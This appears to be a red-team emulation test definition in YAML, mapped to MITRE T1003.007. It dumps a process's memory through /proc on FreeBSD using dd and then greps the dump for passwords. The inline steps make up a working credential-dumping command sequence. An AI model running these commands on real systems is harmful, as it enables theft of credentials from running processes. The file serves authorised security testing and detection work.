api_version: "2.0"
name: Dump individual process memory with sh on FreeBSD (Local)
description: |
    Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
    copy process memory to an external file so it can be searched or exfiltrated later.
    On FreeBSD procfs must be mounted.
args:
    - name: pid_term
      type: string
      default: T1003.007
    - name: output_file
      type: path
      default: /tmp/T1003.007.bin
    - name: script_path
      type: path
      default: /tmp/T1003.007.sh
uuid: fa37b633-e097-4415-b2b8-c5bf4c86e423
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.007: Proc Filesystem'
requirements:
    platforms:
        - os: linux
steps:
    - name: dump-individual-process-memory-with-sh-on-freebsd-(local)
      inline: |
        sh {{.Args.script_path}}
        PID=$(pgrep -n -f "{{.Args.pid_term}}")
        MEM_START=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f1)
        MEM_STOP=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f2)
        MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))
        dd if=/proc/"${PID}"/mem of="{{.Args.output_file}}" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
        strings "{{.Args.output_file}}" | grep -i PASS
      executor: sh
      cleanup:
        inline: |
            rm -f "{{.Args.output_file}}"
        executor: sh
